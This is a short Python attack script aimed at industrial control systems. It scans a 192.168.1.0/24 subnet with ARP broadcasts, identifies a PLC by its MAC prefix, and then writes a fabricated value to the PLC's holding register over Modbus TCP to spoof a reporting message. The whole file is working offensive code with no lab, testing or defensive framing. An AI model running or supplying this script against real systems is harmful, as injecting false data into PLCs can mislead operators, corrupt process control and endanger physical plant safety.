from pymodbus.client.sync import ModbusTcpClient
from scapy.all import ARP, Ether, srp
import time

def find_plc_ip():
    # Define the network to scan (e.g., '192.168.1.0/24')
    network = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Extract the IP and MAC addresses from the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    # Assuming the PLC has a known MAC address prefix (e.g., '00:1D:9C')
    plc_mac_prefix = "00:1D:9C"
    for device in devices:
        if device['mac'].startswith(plc_mac_prefix):
            return device['ip']

    return None

def spoof_reporting_message(plc_ip):
    # Connect to the PLC using Modbus TCP
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print("Failed to connect to the PLC.")
        return

    # Spoof a reporting message by writing fake values to the PLC's holding registers
    try:
        # Example: Write a fake value to register 0 (assuming it's a reporting register)
        fake_value = 1234
        client.write_register(address=0, value=fake_value, unit=1)
        print(f"Spoofed reporting message with value: {fake_value}")

    except Exception as e:
        print(f"Error spoofing reporting message: {e}")

    finally:
        client.close()

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("PLC not found on the network.")
        exit(1)

    print(f"Found PLC at IP: {plc_ip}")

    # Step 2: Spoof reporting messages
    spoof_reporting_message(plc_ip)